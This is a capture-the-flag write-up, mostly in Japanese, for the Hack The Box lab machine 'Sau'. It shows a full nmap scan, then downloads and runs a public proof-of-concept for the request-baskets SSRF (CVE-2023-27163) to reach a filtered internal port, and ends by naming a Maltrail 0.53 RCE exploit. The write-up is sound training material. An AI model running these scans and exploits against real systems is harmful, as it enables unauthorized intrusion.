https://app.hackthebox.com/machines/Sau

## STEP 1
```sh
└─$ nmap -n -Pn -p- -sV 10.129.229.26                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 09:15 EDT
Nmap scan report for 10.129.229.26
Host is up (0.66s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   filtered http
8338/tcp filtered unknown
55555/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=6/30%Time=68628E34%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2030\x20Jun\x20
SF:2025\x2013:16:34\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2030\x20Jun\x20
SF:2025\x2013:16:38\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Mon,\x2030\x20Jun\x202025\x2
SF:013:17:03\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1000 seconds
```


## STEP 2
55555番にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_01.png" width="100%" height="100%">  
`request-backets`バージョン1.2.1には、CVE-2023-27163（SSRFの脆弱性）が存在する  
[PoC](https://github.com/entr0pie/CVE-2023-27163/tree/main)では、ターゲットで内部向けのポートへフォワーディングできる  
nmapの結果では80番がフィルタされていたのでPoCで確認してみる
```sh
└─$ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh  
--2025-06-30 09:12:20--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1669 (1.6K) [text/plain]
Saving to: ‘CVE-2023-27163.sh’

CVE-2023-27163.sh                                          100%[========================================================================================================================================>]   1.63K  --.-KB/s    in 0s      

2025-06-30 09:12:21 (24.1 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]


└─$ ./CVE-2023-27163.sh       
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

Usage: CVE-2023-27163.sh <URL> <TARGET>

This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,
which will act as a proxy to other services and servers.

Arguments:
 URL            main path (/) of the server (eg. http://127.0.0.1:5000/)
 TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)

More info at https://github.com/entr0pie/CVE-2023-27163.


└─$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "mtpggm" proxy basket...
> Basket created!
> Accessing http://10.129.229.26:55555/mtpggm now makes the server request to http://127.0.0.1:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"7QE7vU41tjWjcv3ki3lGO01uqgHnFUkunvY5jRfjXWzB"}
```
PoCで作成されたurlにアクセス、80番へのアクセスが成功した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_02.png" width="50%" height="50%">


## STEP 3
80番で動作している、Maltrail 0.53 にもRCEの脆弱性がある
https://github.com/spookier/Maltrail-v0.53-Exploit
